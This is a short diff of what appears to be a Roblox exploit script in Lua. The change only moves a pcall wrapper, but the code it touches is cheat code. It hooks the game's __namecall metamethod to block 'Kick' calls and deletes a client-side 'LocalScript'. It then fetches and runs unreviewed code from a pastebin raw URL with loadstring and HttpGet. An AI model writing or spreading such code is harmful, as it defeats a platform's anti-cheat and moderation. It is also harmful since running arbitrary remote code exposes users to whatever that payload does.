@@ -1,4 +1,5 @@
-local old
+pcall(function()
+        local old
 
         old = hookmetamethod(game, "__namecall", function(...)
             if getnamecallmethod() == "Kick" then 
@@ -33,5 +34,6 @@ local old
         if game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript") then
         game.Players.LocalPlayer.PlayerScripts:FindFirstChild("LocalScript"):Destroy()
         end
-        pcall(function()
+
         loadstring(game:HttpGet("https://pastebin.com/raw/BMGbkQ71"))();
+end)
